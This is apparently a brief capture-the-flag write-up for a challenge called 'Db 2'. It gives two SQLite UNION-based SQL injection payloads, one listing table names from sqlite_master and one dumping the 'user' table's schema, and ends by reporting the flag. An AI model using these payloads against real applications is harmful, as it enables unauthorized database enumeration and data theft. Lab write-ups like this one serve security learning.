# Db 2

After looking up sqlite formats i made the payload
```sql
' UNION SELECT name,NULL,NULL,NULL FROM sqlite_master;--
```
To get all table names and then
```sql
' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE name = 'user' AND type = 'table';--
```
To get the settings of that table. the flag was 58
